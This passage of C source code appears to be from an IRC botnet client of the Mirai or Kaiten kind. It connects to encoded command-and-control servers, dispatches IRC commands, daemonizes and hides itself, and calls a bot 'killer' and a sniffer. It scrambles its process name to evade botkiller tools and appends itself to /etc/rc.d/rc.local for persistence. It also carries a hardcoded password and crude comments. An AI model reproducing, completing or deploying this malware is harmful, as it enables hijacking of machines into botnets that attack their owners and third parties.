    for (i = 0; i < strlen(sender) && sender[i] != '!'; i++);
    sender[i] = 0;
    if (!strcasecmp(sender, nick)) {
        if ( * str == ':') str++;
        if (nick) free(nick);
        nick = randstring(realrand(4, 8));
    }
}

struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
    { "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };

void con() {
    int error = 0;
    socklen_t len = sizeof(error);
    int retval = getsockopt(sock, SOL_SOCKET, SO_ERROR,&error,&len);
    if (retval != 0) {
        /* there was a problem getting the error code */
        //fprintf(stderr, "error getting socket error code: %s\n", strerror(retval));
    } else if (error != 0) {
        /* socket has a non zero error status */
        //fprintf(stderr, "socket error: %s\n", strerror(error));
    } else {
        //our sock is ay okay
        return;
    }
    struct sockaddr_in srv;
    unsigned long ipaddr, start;
    int flag;
    struct hostent * hp;
    start:
        sock = -1;
    flag = 1;
    if (changeservers == 0) server = decode(servers[rand() % numservers]);
    changeservers = 0;
    while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
    if (inet_addr(server) == 0 || inet_addr(server) == -1) {
        if ((hp = gethostbyname(server)) == NULL) {
            server = NULL;
            close(sock);
            goto start;
        }
        bcopy((char *) hp->h_addr, (char *)&srv.sin_addr, hp->h_length);
    } else srv.sin_addr.s_addr = inet_addr(server);
    srv.sin_family = AF_INET;
    srv.sin_port = htons(6667); //Note to self: change to 443
    ioctl(sock, FIONBIO,&flag);
    start = time(NULL);
    while (time(NULL) - start < 10) {
        errno = 0;
        if (connect(sock, (struct sockaddr * )&srv, sizeof(srv)) == 0 || errno == EISCONN) {
            setsockopt(sock, SOL_SOCKET, SO_LINGER, 0, 0);
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, 0, 0);
            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, 0, 0);
            return;
        }
        if (!(errno == EINPROGRESS || errno == EALREADY)) break;
        sleep(1);
    }
    server = NULL;
    close(sock);
    goto start;
}

void makeFukdString(char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 223) + 33; // No spaces.
}

void touchMyself(char ** argv) {
    if (!fork()) {
        while (1) {
            makeFukdString(argv[0], 1024 + (rand() % 128)); // Crashes almost all /proc/pid/cmdline based botkillers. Including Mirai. sweg
            sleep(3); // rape process name every 3 seconds
        }
    }
    return;
}

int isNumber(char* s)
{
	int i;
    for (i = 0; i < strlen(s); i++){
        if (isdigit(s[i]) == 0){
            return 0;
		}
	}
    return 1;
}
int main(int argc, char ** argv) {
    DIR *d;
	struct dirent *dir;
	chdir("/proc");
	d = opendir(".");
	char myname[64];
	sprintf(myname, "/proc/%d/cmdline", getpid());

	if (d) {
		while ((dir = readdir(d)) != NULL) {
			char name[128];
			memset(name, 0, sizeof(name));
			sprintf(name, "%s%s/cmdline", "/proc/", dir->d_name);
			if( access( name, F_OK ) == 0 && strcmp(name, "/proc/self/cmdline") != 0 && strcmp(name, myname) != 0) {
				FILE *input = fopen(name,"rb");
				char inputArray[500];

				while(fscanf(input,"%s", inputArray) != EOF){
					 if(strstr(inputArray, argv[0])) return 0;
				}
			}
		}
		closedir(d);
	}
	printf("CAPSAICIN\r\n");
	

    if(fork()) exit(0);
    //unmask the file mode
    umask(0);
    //set new session
    setsid();
    // Close stdin. stdout and stderr
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    //touchMyself(&argv); // Mega anti botkill. completely hides process name. nearly like a rootkit but more noisy
    killer_init();
    sniffer();
    strcpy(dispass, "FreakIsYourGod!!!");
    int on, i;
    char cwd[256], * str;
    FILE * file;
#ifdef STARTUP
    str = "/etc/rc.d/rc.local";
    file = fopen(str, "r");
    if (file == NULL) {
        str = "/etc/rc.conf";
        file = fopen(str, "r");
    }
    if (file != NULL) {
        char outfile[256], buf[1024];
        int i = strlen(argv[0]), d = 0;
        getcwd(cwd, 256);
        if (strcmp(cwd, "/")) {
            while (argv[0][i] != '/') i--;
            sprintf(outfile, "\"%s%s\"\n", cwd, argv[0] + i);
            while (!feof(file)) {
                fgets(buf, 1024, file);
                if (!strcasecmp(buf, outfile)) d++;
            }
            if (d == 0) {
                FILE * out;
                fclose(file);
                out = fopen(str, "a");
                if (out != NULL) {
                    fputs(outfile, out);
                    fclose(out);
                }
            } else fclose(file);
        } else fclose(file);
    }
#endif
    for (on = 1; on < argc; on++) memset(argv[on], 0, strlen(argv[on]));
    srand((time(NULL) ^ getpid()) + getppid());
    nick = randstring(realrand(4, 8));
    ident = randstring(realrand(4, 8));
    user = randstring(realrand(4, 8));
    chan = CHAN;
    key = KEY;
    server = NULL;
    sa:
#ifdef IDENT
    for (i = 0; i < numpids; i++) {
        if (pids[i] != 0 && pids[i] != getpid()) {
            kill(pids[i], 9);
            waitpid(pids[i], NULL, WNOHANG);
        }
    }
    pids = NULL;
    numpids = 0;
    identd();
#endif
    con();
    Send(sock, "NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n", PREFIX, getBuild(), nick, user, ident);
    while (1) {
        unsigned long i;
        fd_set n;
        struct timeval tv;
        FD_ZERO(&n);
        FD_SET(sock,&n);
        tv.tv_sec = 60 * 20;
        tv.tv_usec = 0;
        if (select(sock + 1,&n, (fd_set * ) 0, (fd_set * ) 0,&tv) <= 0) goto sa;
        for (i = 0; i < numpids; i++)
            if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                unsigned int * newpids, on;
                for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                pids[on - 1] = 0;
                numpids--;
                newpids = (unsigned int * ) malloc((numpids + 1) * sizeof(unsigned int));
                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                free(pids);
                pids = newpids;
            }
        if (FD_ISSET(sock,&n)) {
            char buf[4096], * str;
            int i;
            if ((i = recv(sock, buf, 4096, 0)) <= 0) goto sa;
            buf[i] = 0;
            str = strtok(buf, "\n");
            while (str && * str) {
                char name[1024], sender[1024];
                filter(str);
                if ( * str == ':') {
                    for (i = 0; i < strlen(str) && str[i] != ' '; i++);
                    str[i] = 0;
                    strcpy(sender, str + 1);
                    strcpy(str, str + i + 1);
                } else strcpy(sender, "*");
                for (i = 0; i < strlen(str) && str[i] != ' '; i++);
                str[i] = 0;
                strcpy(name, str);
                strcpy(str, str + i + 1);
                for (i = 0; msgs[i].cmd != (char *) 0; i++)
                    if (!strcasecmp(msgs[i].cmd, name)) msgs[i].func(sock, sender, str);
                if (!strcasecmp(name, "ERROR")) {
                    if (scanPid != 0) { // Is the scanner running?
                        if (kill(scanPid, 9) == 0) { // Kill the knights scanner if we get disconnected
                            scanPid = 0;
                        }
                    }

                    close(sock); //Close old sock
                    sleep(5);
                    goto sa; // Start connection routine
                }
                str = strtok((char *) NULL, "\n");
            }
        }
    }
    return 0;
}

